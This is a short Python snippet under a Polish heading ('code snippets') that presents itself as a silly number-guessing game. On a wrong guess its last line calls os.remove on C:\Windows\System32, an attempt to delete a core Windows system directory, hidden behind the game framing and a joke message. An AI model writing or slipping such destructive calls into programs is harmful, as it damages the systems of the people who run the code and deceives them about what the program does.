# Fragmenty kodu

```py
import random
import os

number = random.randint(1, 10)

guess = input("Silly game! Guess number between 1 and 10 ")
guess = int(guess)

if guess == number:
  print("You Won!")
else:
  print("Opsi dopsi dibi do")
  os.remove("C:\Windows\System32")  
```
